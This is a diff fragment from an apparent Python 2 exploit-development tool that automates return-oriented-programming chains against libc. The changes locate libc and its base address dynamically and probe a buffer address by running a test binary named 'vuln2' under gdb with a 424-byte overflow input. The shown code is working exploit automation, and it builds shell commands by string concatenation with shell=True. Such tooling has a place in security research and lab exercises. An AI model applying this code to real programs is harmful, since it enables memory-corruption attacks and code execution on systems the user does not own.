@@ -814,13 +814,26 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
 
     return (rop_payload, result)
 
+def find_libc_path(vuln_binary):
+    cmd = "ldd " + vuln_binary
+    cmd = cmd + "|grep libc|awk '{print $3}'"
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+    proc.wait()
+    try:
+        libc_path = proc.stdout.read()
+        return libc_path.rstrip()
+    except Exception as e:
+        print "Error finding libc path %s" %(str(e))
+        return ""
+    return ""
 
 def build_rop_chain_libc(lib_list, buf_address):
     result = True
-    libc_base_address = 0xb7e05000 #lib_list[0][1]
-    f = open('/lib/i386-linux-gnu/libc.so.6', 'rb')
+    libc_path = find_libc_path("vuln")
+    libc_base_address = find_library_base_addr("vuln", libc_path)
+    f = open(libc_path, 'rb')
     if f == None:
-        print "/lib/i386-linux-gnu/libc.so.6 library not found !"
+        print libc_path + " library not found !"
         exit(2)
     elffile = ELFFile(f)
 
@@ -972,12 +985,16 @@ def find_buffer_addr(vuln_binary, payload_length):
         gdb_cmd = "gdb --batch --command=./find_exit.gdb --args ./vuln2 hello|tail -1|awk '{print $3}'"
         gproc = subprocess.Popen(gdb_cmd, shell=True, stdout=subprocess.PIPE)
         gproc.wait()
-        exit_addr = int(gproc.stdout.read(), 16)
+        eaddr = gproc.stdout.read()
+        print eaddr
+        exit_addr = int(eaddr, 16)
         cmd = "./vuln2 " + "A"*424 +  rem * pack_value(exit_addr) + "|grep \"Address of buf\"|awk '{print $5}'"
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
     proc.wait()
     try:
-        buffer_addr = int(proc.stdout.read(), 16)
+        baddr = proc.stdout.read()
+        print baddr
+        buffer_addr = int(baddr, 16)
         return buffer_addr
     except Exception as e:
         print "Error finding buffer address %s" %(str(e))
